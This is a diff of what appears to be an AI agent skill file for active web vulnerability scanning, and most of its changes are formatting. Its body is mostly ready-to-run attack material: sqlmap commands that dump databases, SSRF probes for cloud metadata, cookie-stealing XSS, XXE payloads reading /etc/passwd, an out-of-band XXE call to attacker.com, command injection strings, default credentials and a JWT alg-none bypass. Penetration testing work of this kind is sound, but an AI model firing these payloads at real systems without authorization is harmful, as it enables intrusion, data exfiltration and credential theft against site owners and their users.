@@ -20,15 +20,15 @@ metadata:
               "kind": "shell",
               "cmd": "pip3 install requests httpx rich pyyaml",
               "bins": [],
-              "label": "Install vuln-scanner dependencies (pip)"
+              "label": "Install vuln-scanner dependencies (pip)",
             },
             {
               "id": "brew-nuclei",
               "kind": "brew",
               "formula": "nuclei",
               "bins": ["nuclei"],
-              "label": "Install Nuclei template scanner (brew)"
-            }
+              "label": "Install Nuclei template scanner (brew)",
+            },
           ],
       },
   }
@@ -45,12 +45,15 @@ Active scanning to detect, confirm, and produce evidence for critical security v
 ## Vulnerability Categories
 
 ### 1. Remote Code Execution (RCE) — CVSS 9.0–10.0
+
 Detect command injection and deserialization flaws that lead to full server compromise.
 
 **Usage:**
+
 > Detect RCE vulnerabilities in https://target.com — test all endpoints
 
 **Detection Approach:**
+
 - Command injection via `; id`, `$(id)`, `` `id` `` in form fields / parameters
 - Java deserialization (`ysoserial` payloads against Java endpoints)
 - Server-Side Template Injection (SSTI) via `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`
@@ -63,18 +66,22 @@ Detect command injection and deserialization flaws that lead to full server comp
 ---
 
 ### 2. SQL Injection — CVSS 7.5–9.8
+
 Detect both error-based and blind (boolean/time-based) SQL injection points.
 
 **Usage:**
+
 > Scan https://target.com for SQL injection vulnerabilities and extract database version
 
 **Detection Approach:**
+
 - Error-based: `'`, `''`, `1'`, `"`, `1"`, `\`
 - Boolean blind: `1 AND 1=1--`, `1 AND 1=2--`
 - Time-based blind: `1; WAITFOR DELAY '0:0:5'--`, `1' AND SLEEP(5)--`
 - Union-based: `1 UNION SELECT NULL,NULL,NULL--`
 
 **Validation (PoC):**
+
 ```bash
 sqlmap -u "https://target.com/page?id=1" --dbs --batch --level=3 --risk=2
 sqlmap -u "https://target.com/" --forms --dbs --batch
@@ -86,17 +93,21 @@ sqlmap -u "https://target.com/" --forms --dbs --batch
 ---
 
 ### 3. Server-Side Request Forgery (SSRF) — CVSS 7.2–9.8
+
 Detect SSRF vulnerabilities that allow access to internal services and cloud metadata.
 
 **Usage:**
+
 > Test all URL parameters at https://target.com for SSRF
 
 **Detection Approach:**
+
 - Inject internal IP probes: `http://127.0.0.1`, `http://169.254.169.254` (AWS IMDS)
 - DNS callback: inject a unique domain and check DNS resolution
 - Protocol confusion: `file:///etc/passwd`, `gopher://`, `dict://`
 
 **Validation Payloads:**
+
 ```
 http://169.254.169.254/latest/meta-data/
 http://[::1]/
@@ -110,17 +121,21 @@ file:///etc/passwd
 ---
 
 ### 4. Cross-Site Scripting (XSS) — CVSS 4.3–8.0
+
 Detect reflected, stored, and DOM-based XSS across all input vectors.
 
 **Usage:**
+
 > Scan https://target.com for stored and reflected XSS vulnerabilities
 
 **Detection Approach:**
+
 - Reflected: inject unique markers, check for unescaped reflection
 - Stored: submit payload and retrieve on another page
 - DOM-based: analyze JS source for dangerous sinks (`innerHTML`, `eval`, `document.write`)
 
 **Validation Payloads:**
+
 ```javascript
 <script>alert(document.domain)</script>
 "><img src=x onerror=alert(1)>
@@ -134,12 +149,15 @@ javascript:alert(document.cookie)
 ---
 
 ### 5. XML External Entity (XXE) — CVSS 7.5–9.8
+
 Detect XXE injection in XML-accepting endpoints.
 
 **Usage:**
+
 > Test XML endpoints at https://target.com for XXE injection
 
 **Detection Payloads:**
+
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
@@ -147,6 +165,7 @@ Detect XXE injection in XML-accepting endpoints.
 ```
 
 **Blind XXE (OOB):**
+
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
@@ -159,12 +178,15 @@ Detect XXE injection in XML-accepting endpoints.
 ---
 
 ### 6. Path Traversal / LFI — CVSS 7.5
+
 Read arbitrary files from the server filesystem.
 
 **Usage:**
+
 > Test file download and include parameters at https://target.com for path traversal
 
 **Detection Payloads:**
+
 ```
 ../../../etc/passwd
 ..%2F..%2F..%2Fetc%2Fpasswd
@@ -180,12 +202,15 @@ Read arbitrary files from the server filesystem.
 ---
 
 ### 7. Authentication Bypass — CVSS 7.5–9.8
+
 Detect broken authentication logic across login and session management.
 
 **Usage:**
+
 > Test authentication at https://target.com for bypass vulnerabilities
 
 **Tests:**
+
 - Default credentials: `admin:admin`, `admin:password`, `root:root`
 - SQL injection in login: `admin'--` / `' OR 1=1--`
 - JWT: `alg: none` attack, weak secret brute-force
@@ -197,12 +222,15 @@ Detect broken authentication logic across login and session management.
 ---
 
 ### 8. Command Injection — CVSS 9.0–10.0
+
 Detect OS command injection in server-side parameters.
 
 **Usage:**
+
 > Test all input fields at https://target.com for OS command injection
 
 **Detection Payloads:**
+
 ```
 ; id
 | id
@@ -220,12 +248,15 @@ $(id)
 ---
 
 ### 9. Insecure Deserialization — CVSS 8.1–9.8
+
 Detect unsafe deserialization in Java, PHP, Python, and .NET applications.
 
 **Usage:**
+
 > Test Java application at https://target.com for deserialization vulnerabilities
 
 **Detection Approach:**
+
 - Java: Look for serialized objects (`aced0005`) in cookies, request body, headers
 - PHP: `O:8:"stdClass":0:{}` in session cookies
 - Python: pickle-based endpoints
@@ -238,12 +269,15 @@ Detect unsafe deserialization in Java, PHP, Python, and .NET applications.
 ---
 
 ### 10. Known CVE Detection (Nuclei Templates)
+
 Scan for exploitable known CVEs using the latest community Nuclei templates.
 
 **Usage:**
+
 > Scan https://target.com for known CVEs with CVSS score >= 9.0
 
 **Scans:**
+
 ```bash
 # Critical CVEs only
 nuclei -u https://target.com -severity critical -stats -o nuclei_crits.txt
@@ -263,12 +297,15 @@ nuclei -l subs.txt -t cves/ -severity critical,high -o findings.txt
 ---
 
 ### 11. Security Misconfiguration Detection — CVSS 5.3–9.8
+
 Detect exposed admin panels, debug endpoints, default configs, and sensitive files.
 
 **Usage:**
+
 > Scan https://target.com for security misconfigurations and exposed sensitive paths
 
 **Checks:**
+
 ```bash
 # Exposed panels and configs
 nuclei -u https://target.com -t exposures/ -t misconfiguration/ -severity medium,high,critical
@@ -279,6 +316,7 @@ ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-C
 ```
 
 **Common paths checked:**
+
 ```
 /.env, /.git/, /backup.zip, /config.json, /wp-config.php
 /phpinfo.php, /admin/, /actuator/, /debug, /console
@@ -300,12 +338,12 @@ Step 3 — REPORT    : Document with screenshot/response, CVSS score, OWASP ref
 
 ### Evidence Requirements by Severity
 
-| Severity | Evidence Required |
-|---|---|
-| **Critical** | Full PoC — extracted data, command output, or OOB callback |
-| **High** | Deterministic confirmation — error message, timing, behavior |
-| **Medium** | Consistent anomaly — repeated with probe variation |
-| **Low** | Policy violation — missing header, verbose error |
+| Severity     | Evidence Required                                            |
+| ------------ | ------------------------------------------------------------ |
+| **Critical** | Full PoC — extracted data, command output, or OOB callback   |
+| **High**     | Deterministic confirmation — error message, timing, behavior |
+| **Medium**   | Consistent anomaly — repeated with probe variation           |
+| **Low**      | Policy violation — missing header, verbose error             |
 
 ---
 
